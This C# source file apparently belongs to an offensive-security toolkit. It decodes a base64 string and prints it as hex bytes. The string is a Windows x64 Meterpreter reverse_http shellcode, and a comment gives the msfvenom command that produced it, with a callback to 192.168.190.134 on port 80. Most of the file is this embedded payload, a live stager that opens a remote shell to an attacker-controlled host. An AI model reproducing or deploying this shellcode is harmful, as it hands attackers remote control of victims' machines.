using System;

// Compile:
//  c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:b64string.exe /target:exe b64string.cs
namespace B64
{

	class Program
	{

		public static void Main()
		{

        // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
        // python3 b64.py  
		string s = "/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BAAAAAxOTIuMTY4LjE5MC4xMzQAWkiJwUnHwFAAAABNMclTU2oDU0m6V4mfxgAAAAD/1ehNAAAAL3JlRXZkZGo2cW5Ka0oyVWxBZDZnYUF2anZya2lTQ3A2TUtWc1hYd3JOenNoamhsa0QzS2NCdTZBa2RDWDh0SDZ2SkxYNktSV1VuVwBIicFTWkFYTTHJU0i4AAIohAAAAABQU1NJx8LrVS47/9VIicZqCl9TWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890AuvM6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==";
		
		byte[] shellcode = Convert.FromBase64String(s);
		int idx = 0;
		while (idx < shellcode.Length)
		{
			Console.Write("{0} ", shellcode[idx].ToString("x2"));
			idx = idx + 1;
		}
		
		}
	}
}
